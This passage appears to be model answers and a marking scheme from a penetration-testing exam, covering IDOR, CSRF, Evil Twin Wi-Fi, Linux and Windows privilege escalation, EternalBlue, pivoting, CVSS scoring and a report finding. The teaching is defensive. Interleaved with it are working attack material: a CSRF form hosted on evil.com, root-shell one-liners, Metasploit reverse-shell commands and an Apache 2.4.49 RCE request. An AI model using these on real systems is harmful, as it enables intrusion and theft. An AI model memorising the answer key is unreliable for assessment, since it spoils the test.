  - Putting sensitive administrative directories (`Disallow: /admin/`, `Disallow: /internal-api/`, `Disallow: /backup/`) in `robots.txt` publishes a public roadmap of the organization's most sensitive, hidden directories for any attacker to target directly.
  - Web servers will freely serve pages listed in `robots.txt` to any client that requests them unless real access control (authentication, IP whitelisting) is enforced on the web server itself.

#### (b) Web Application Exploitation: IDOR & CSRF [4 Marks]

##### 1. Horizontal Privilege Escalation (IDOR)
- **Vulnerability Mechanism**:
  - The endpoint `GET /api/statement?account_id=10042` uses an untrusted direct object reference supplied by the client.
  - When user Alice (`account_id=10042`) alters the parameter to `10043` (Bob's account), the backend application queries the database for `10043` and returns Bob's private financial statement without verifying whether Alice is authorized to access Bob's data. This constitutes **Horizontal Privilege Escalation (Insecure Direct Object Reference - IDOR)**.
- **Server-Side Code Remediation**:
  - Enforce strict server-side **Context-Based Access Control** binding objects to the authenticated session context:
  ```python
  # Vulnerable:
  # account_id = request.args.get('account_id')
  # return db.query("SELECT * FROM statements WHERE account_id = ?", account_id)

  # Secure Remediation:
  session_user_id = session.get('current_user_id')  # Extracted from validated JWT/Session
  account_id = request.args.get('account_id')

  statement = db.query(
      "SELECT * FROM statements WHERE account_id = ? AND owner_user_id = ?",
      account_id, session_user_id
  )
  if not statement:
      raise AuthorizationException("Access Denied: You do not own this account asset.")
  return jsonify(statement)
  ```

##### 2. Cross-Site Request Forgery (CSRF) & Defenses
- **Attack Construction**:
  - Alice logs into `https://ebank.corp.com` and has an active authentication session cookie stored in her browser.
  - Attacker hosts a malicious web page `http://evil.com` containing a hidden auto-submitting HTML form:
    ```html
    <form action="https://ebank.corp.com/api/transfer" method="POST" id="csrfForm">
      <input type="hidden" name="to_account" value="99999" />
      <input type="hidden" name="amount" value="50000" />
    </form>
    <script>document.getElementById('csrfForm').submit();</script>
    ```
  - When Alice visits `evil.com`, her browser automatically executes the POST request to `ebank.corp.com`.
  - Because browsers automatically append stored domain cookies to cross-site requests, the bank server receives valid session cookies and processes the unauthorized 50,000 transfer.
- **Neutralization Defenses**:
  1. **Anti-CSRF Synchronizer Tokens**:
     - The server generates a cryptographically random, unpredictable token per user session (or per request).
     - The token is embedded within legitimate application forms as a hidden field.
     - Upon submission, the server verifies that the submitted form token matches the token stored in the server session. Since cross-origin requests from `evil.com` cannot read the victim's token (due to the Same-Origin Policy), the forged request fails validation.
  2. **`SameSite=Strict` Cookie Attribute**:
     - Configured as: `Set-Cookie: session_id=xyz; Secure; HttpOnly; SameSite=Strict;`
     - The browser will **never** attach the session cookie to any cross-site request (including link clicks or form submissions originating from external domains like `evil.com`). The request arrives at the bank unauthenticated, preventing CSRF completely.

#### (c) Legal Framework: Indian IT Act 2000 & Ethical Prerequisites [4 Marks]

##### 1. Legal Analysis of Key Sections
| Section | Scope of Offence | Penalties / Consequences |
| :--- | :--- | :--- |
| **Section 43** | Civil liability for unauthorized access, data copying, downloading, extraction, virus introduction, or damaging computer systems without permission of the owner. | Compensation up to **₹1 Crore** to the affected victim. |
| **Section 66** | Criminal computer-related offences: Any act committed under Section 43 with dishonestly or fraudulent intent (hacking). | Imprisonment up to **3 years**, or fine up to **₹5 Lakhs**, or both. |
| **Section 66C** | Identity theft: Fraudulent or dishonest use of electronic signature, password, or unique identification feature of any person. | Imprisonment up to **3 years** and fine up to **₹1 Lakh**. |
| **Section 66D** | Cheating by personation using computer resources (phishing, impersonation scams). | Imprisonment up to **3 years** and fine up to **₹1 Lakh**. |
| **Section 66F** | **Cyber Terrorism**: Acts committed with intent to threaten the unity, integrity, security, or sovereignty of India, or striking terror by denying authorized access to critical infrastructure. | Imprisonment up to **Life Imprisonment** (Rigorous). |

##### 2. 4 Mandatory Legal Prerequisites for Ethical Hackers
To establish legal immunity and prevent prosecution under Section 66:
1. **Statement of Work (SOW)**: A formal legal contract outlining the technical boundaries, target domains, explicit IP ranges, allowed testing hours, and deliverables.
2. **Rules of Engagement (RoE)**: Operational document defining permitted attack techniques (e.g., whether social engineering, phishing, or DoS testing are explicitly disallowed), communication channels, and emergency pause contacts.
3. **Non-Disclosure Agreement (NDA)**: Binding confidentiality covenant ensuring all customer vulnerabilities, network architecture diagrams, and discovered data remain strictly confidential.
4. **Formal Letter of Authorization ("Get Out of Jail Free" Card)**: Signed document from the corporate asset owner (e.g., CISO) granting explicit, written legal authorization to probe the specified systems within the defined timeframe. Must be physically or digitally carried during testing.

#### Marking Scheme (Q9)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) OSINT & Google Dorking | Sound recon strategy + 4 accurate dorks + robots.txt risk explanation | 4.0 M |
| (b.1) IDOR Mechanics & Remediation | Parameter tampering mechanism + secure server-side session check code | 2.0 M |
| (b.2) CSRF Attack & Defenses | Complete exploit HTML payload + Synchronizer Tokens + SameSite=Strict | 2.0 M |
| (c.1) IT Act 2000 Provisions | Analysis of Sec 43, 66, 66C, 66D, 66F with jail and fine terms | 2.0 M |
| (c.2) 4 Mandatory Prerequisites | Accurate explanation of SOW, RoE, NDA, and Letter of Authorization | 2.0 M |
| **Total for Q9** | | **12.0 M** |

---

### Q10. Internal Network Penetration, Privilege Escalation & Pivoting [12 Marks]

#### (a) Wireless Exploitation: Evil Twin Attack & Countermeasures [4 Marks]
* **Deployment Workflow of an Evil Twin Attack**:
  ```
  Attacker Laptop (Alfa AWUS036ACH)
  [Rogue AP: "Corp-WiFi"] <=== Forged Beacon Frames
            |
            |<==== [Client Disconnected via Deauth Frame]
            |
  Victim Connects to Rogue AP
            |
  DNS Spoofing (All DNS queries -> Attacker IP)
            |
  HTTP 302 Redirect to Phishing Captive Portal ("Firmware Update - Enter AD Password")
            |
  Victim Enters Domain Credentials -> Harvested by Attacker in Cleartext
  ```
  1. *SSID Cloning*: The attacker configures a wireless interface using `hostapd` or `airbase-ng` broadcasting the identical SSID (`Corp-WiFi`) and matching BSSID/channel characteristics of the legitimate corporate access point.
  2. *Deauthentication*: Attacker transmits continuous 802.11 Deauth frames targeting enterprise clients connected to the real AP.
  3. *Client Association*: Client devices drop connection and automatically reconnect to the attacker's Evil Twin AP because the attacker broadcasts at a higher transmission power (higher RSSI signal).
  4. *Captive Portal Credential Harvesting*: Attacker runs a local DHCP and DNS server (e.g., `dnsmasq`) redirecting all web traffic to a phishing captive portal styled identically to corporate Active Directory Federation Services (ADFS). The victim inputs their corporate username and domain password, which the attacker logs.
* **3 Enterprise Wireless Hardening Countermeasures**:
  1. **802.11w Protected Management Frames (PMF)**: Cryptographically signs management frames (Deauth, Disassociation), preventing attackers from injecting spoofed deauthentication packets.
  2. **802.1X Enterprise Authentication (WPA2/WPA3 Enterprise)**: Replaces static pre-shared keys with certificate-based EAP-TLS authentication where client devices validate the authentic server certificate before exchanging credentials.
  3. **Wireless Intrusion Prevention System (WIPS)**: Continuously monitors RF space for unauthorized BSSIDs advertising corporate SSIDs and dynamically suppresses rogue access points.

#### (b) Privilege Escalation Mechanics [4 Marks]

##### 1. Linux Privilege Escalation: SUID Binaries & Insecure Sudoers
- **SUID Binary Discovery & Exploitation**:
  - SUID (`Set User ID`, octal bit `4000`) allows an executable file to run with the permissions of the file owner (typically `root`) rather than the executing user.
  - *Discovery Command*:
    ```bash
    find / -perm -u=s -type f 2>/dev/null
    ```
  - *Exploiting `find` (if SUID bit is set)*:
    ```bash
    /usr/bin/find . -exec /bin/sh -p \; -quit
    ```
    The `-exec` flag executes `/bin/sh` inheriting the effective root UID (`euid=0`), instantly providing an interactive root shell.
- **Insecure `/etc/sudoers` Exploitation**:
  - Low-privilege user checks permissions: `sudo -l`
  - Output reveals misconfiguration: `(ALL) NOPASSWD: /usr/bin/vim`
  - *Root Shell Spawn*:
    ```bash
    sudo vim -c ':!/bin/sh'
    ```
    Vim executes an external shell command while running under sudo, dropping the attacker directly into a root shell.

##### 2. Windows Privilege Escalation: Unquoted Service Paths
- **The Architectural Flaw**:
  - When a Windows service executable path contains spaces and is **not enclosed in quotation marks**, the Windows Service Control Manager (SCM) uses ambiguous space-delimited string parsing.
  - Consider the unquoted path:
    ```text
    C:\Program Files\Vulnerable Software\Service Folder\engine.exe
    ```
  - Windows searches for executables in this exact sequential order:
    1. `C:\Program.exe`
    2. `C:\Program Files\Vulnerable.exe`
    3. `C:\Program Files\Vulnerable Software\Service.exe`
    4. `C:\Program Files\Vulnerable Software\Service Folder\engine.exe`
- **Exploitation**:
  1. If a low-privilege attacker has write permissions to `C:\Program Files\`, they create a malicious reverse shell executable named `Vulnerable.exe`.
  2. Upon the next system reboot or service restart (`sc stop / sc start`), the Windows SCM runs `C:\Program Files\Vulnerable.exe` with the service's elevated security context—typically `NT AUTHORITY\SYSTEM`.

#### (c) Metasploit Exploitation & Pivoting [4 Marks]

##### 1. Metasploit EternalBlue (`MS17-010`) Workflow
```bash
# Start Metasploit Console
msfconsole -q

# Select EternalBlue exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Configure target host and local attack IP
set RHOSTS 192.168.1.50
set LHOST 192.168.1.100
set LPORT 4444

# Select 64-bit Meterpreter reverse TCP payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Execute exploit
exploit
```
- **Handler Configuration**: Metasploit automatically initializes `exploit/multi/handler` listening on `0.0.0.0:4444`. Once the SMB kernel pool corruption vulnerability executes, the target injects shellcode, connects back to the handler, and spawns a high-privilege `Meterpreter` session.

##### 2. Network Pivoting & Mandatory Ethical Cleanup
- **Network Pivoting Concept**:
  - Pivoting is the technique of using an already-compromised dual-homed machine (having access to both an external/DMZ subnet and an isolated internal subnet) as a routing relay to scan, exploit, and compromise systems in internal subnets that are physically unreachable from the attacker's origin network.
  ```
  [Attacker Machine] ──► (10.0.1.5) [Compromised DMZ Host] (192.168.10.1) ──► [Internal DB Subnet]
  ```
- **Execution via Meterpreter & Autoroute**:
  ```bash
  # Inside active Meterpreter session on compromised host:
  run autoroute -s 192.168.10.0/24

  # Background session and launch internal auxiliary scan:
  background
  use auxiliary/scanner/portscan/tcp
  set RHOSTS 192.168.10.1-254
  set PORTS 3306,5432,1433
  run
  ```
  All traffic destined for `192.168.10.0/24` is tunneled through the Meterpreter session.
- **Mandatory Ethical Cleanup Rules Prior to Closure**:
  1. Terminate all background reverse shells, Meterpreter sessions, and open listener ports.
  2. Remove all uploaded binary payloads, backdoors, temporary exploit scripts, and dumped memory artifacts.
  3. Delete any test user accounts created during privilege testing and restore modified configuration files to their original baseline state.

#### Marking Scheme (Q10)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a) Evil Twin & Wi-Fi Defense | Complete workflow diagram + rogue portal + 3 campus countermeasures | 4.0 M |
| (b.1) Linux Privilege Escalation | SUID find discovery/syntax + sudoers vim root escape | 2.0 M |
| (b.2) Windows Unquoted Service Path | SCM string parsing logic + malicious binary placement + SYSTEM escalation | 2.0 M |
| (c.1) MS17-010 EternalBlue Config | Exact Metasploit commands, target/payload parameters, and handler flow | 2.0 M |
| (c.2) Pivoting & Ethical Cleanup | Pivoting architecture + autoroute commands + 3 mandatory cleanup rules | 2.0 M |
| **Total for Q10** | | **12.0 M** |

---

### Q11. Incident Analysis, CVSS v3.1 Scoring & VAPT Reporting [12 Marks]

#### (a) WannaCry vs. Equifax & Enterprise Patch Management [4 Marks]

##### 1. Comparative Analysis: WannaCry (2017) vs. Equifax (2017)
| Dimension | WannaCry (May 2017) | Equifax Data Breach (Sept 2017) |
| :--- | :--- | :--- |
| **Vulnerability Exploited** | **MS17-010 (EternalBlue)**: Buffer overflow in Microsoft Server Message Block v1 (SMBv1) protocol (`CVE-2017-0144`). | **CVE-2017-5638**: Remote Code Execution in Apache Struts 2 web framework via Jakarta Multipart parser. |
| **Propagation Vector** | Automated network worm scanning port 445 globally and laterally through internal corporate subnets. | External web exploitation: Malicious HTTP `Content-Type` header with OGNL injection commands sent to web server. |
| **Business Impact** | **Availability Impact**: High-speed encryption of 300,000+ computers across 150 nations, crippling UK National Health Service (NHS) hospitals, railways, and factories. | **Confidentiality Impact**: Exfiltration of highly sensitive PII, SSNs, and credit reports of 147 million consumers; massive regulatory fines (\$700M+) and CEO resignation. |

##### 2. 5-Step Enterprise Patch Management Lifecycle
1. **Asset & Vulnerability Discovery**: Maintain an automated, continuously updated hardware/software asset inventory (using active scanners and agents) cross-referenced against authoritative vulnerability feeds (NVD).
2. **Risk-Based Prioritization**: Score and categorize missing patches based on CVSS v3.1 severity, vendor advisory criticality, and whether weaponized public exploit code actively exists in the wild (e.g., CISA KEV catalog).
3. **Staging & Pre-Production Testing**: Deploy updates to an isolated, representative pre-production staging environment to validate that patches do not break application dependencies or cause system instability.
4. **Controlled Production Deployment & Change Management**: Roll out approved patches during designated maintenance windows using phased canary deployments, maintaining verified system rollback snapshots.
5. **Post-Deployment Verification & Audit**: Re-scan production environments with authenticated vulnerability scanners to verify successful patch installation and update SIEM compliance baselines.

#### (b) CVSS v3.1 Base Metric Evaluation [4 Marks]
Based on the healthcare scenario: Unauthenticated remote attacker exploiting vulnerable Apache service listening on port 443, obtaining `root` execution and accessing 500,000 patient records.

* **Metric Breakdown & Technical Justification**:
  1. **Attack Vector (`AV:N`) = Network**: Exploitable remotely over the public Internet via external HTTPS port 443 without requiring local or physical access.
  2. **Attack Complexity (`AC:L`) = Low**: No specialized conditions or race conditions exist; reliable exploit executes directly against standard Apache endpoint.
  3. **Privileges Required (`PR:N`) = None**: Attacker is unauthenticated; no prior system credentials or accounts are required.
  4. **User Interaction (`UI:N`) = None**: Attack executes completely autonomously; no human victim action (e.g., clicking a link) is required.
  5. **Scope (`S:U`) = Unchanged**: The vulnerable component (Apache) runs with root privileges on the same host where the operating system and data reside.
  6. **Confidentiality Impact (`C:H`) = High**: Total breach of confidentiality; 500,000 electronic health records exfiltrated.
  7. **Integrity Impact (`I:H`) = High**: Root privileges allow total modification or destruction of system files and patient records.
  8. **Availability Impact (`A:H`) = High**: Root access allows stopping services, modifying configurations, or shutting down the healthcare system.

* **CVSS v3.1 Vector String**:
  $$\text{CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H}$$
* **Calculated Base Score**: **9.8**
* **Qualitative Severity Band**: **CRITICAL** (Scores between 9.0 and 10.0 fall into the Critical rating band).

#### (c) Professional VAPT Report Technical Finding Entry [4 Marks]

```markdown
### FINDING-01: Remote Code Execution (RCE) via Unauthenticated Apache Service Vulnerability

* **Vulnerability Title**: Unauthenticated Remote Code Execution in Apache HTTP Service
* **Severity Rating**: CRITICAL (CVSS:3.1 Base Score 9.8 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
* **Affected Asset**: `https://healthportal.healthcare-corp.org:443` (IP: `198.51.100.45`)
* **Vulnerability Classification**: CWE-94 (Improper Control of Generation of Code) / CVE-2021-41773

---

#### 1. Vulnerability Description
During the external penetration test, the security team identified an outdated, unpatched instance of the Apache HTTP Server listening on port 443. The service is susceptible to a path traversal and remote code execution vulnerability. Due to inadequate input validation, an unauthenticated remote adversary can traverse outside the document root and execute arbitrary binaries under the security context of the root/daemon user.

#### 2. Proof of Concept (PoC)
The vulnerability was successfully verified by sending a crafted HTTP POST request executing the system command `id`:

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: healthportal.healthcare-corp.org
Content-Type: text/plain
Content-Length: 7

echo; id
```

**Server HTTP Response:**
```http
HTTP/1.1 200 OK
Date: Wed, 20 Nov 2026 14:22:10 GMT
Server: Apache/2.4.49 (Unix)
Content-Length: 48

uid=0(root) gid=0(root) groups=0(root)
```
*Note: Penetration testing activities were halted immediately upon receiving command execution confirmation to prevent service degradation.*

#### 3. Real-World Business Impact
An unauthenticated attacker can remotely seize total administrative control over the healthcare web infrastructure. This exposes over 500,000 protected electronic health records (ePHI) to unauthorized exfiltration, violating HIPAA and national privacy regulations, leading to catastrophic reputational damage, substantial regulatory fines, and operational downtime.

#### 4. Step-by-Step Technical Remediation
1. **Immediate Patch Deployment**: Update the Apache HTTP Server package immediately to the latest stable release (Apache 2.4.52 or later) via package management:
   ```bash
   apt-get update && apt-get install --only-upgrade apache2
   ```
2. **Restrict Directory Access**: Ensure `httpd.conf` explicitly disallows directory traversal by setting the default directory directive:
   ```apache
   <Directory />
       Require all denied
   </Directory>
   ```
3. **Enforce Least Privilege**: Run the web server process under a dedicated, low-privilege service account (`www-data`) with no login shell (`/bin/false`), strictly preventing root execution.
4. **Deploy WAF Inspection Rules**: Implement Web Application Firewall (WAF) filtering rules to detect and block directory traversal character sequences (`.%2e`) in HTTP requests.
```

#### Marking Scheme (Q11)
| Component | Criteria | Marks |
| :--- | :--- | :--- |
| (a.1) Case Study Contrast | Detailed comparison between WannaCry (SMB/Availability) and Equifax (Struts/Confidentiality) | 2.0 M |
| (a.2) Patch Lifecycle | 5 complete, logical enterprise lifecycle steps | 2.0 M |
| (b) CVSS v3.1 Scoring | All 8 base metrics justified + exact vector string + score 9.8 + Critical band | 4.0 M |
| (c) VAPT Finding Entry | Complete professional template: Title, CVSS, PoC trace, Business Impact, and step-by-step fix | 4.0 M |
| **Total for Q11** | | **12.0 M** |

---
**End of Model Answers & Marking Scheme**
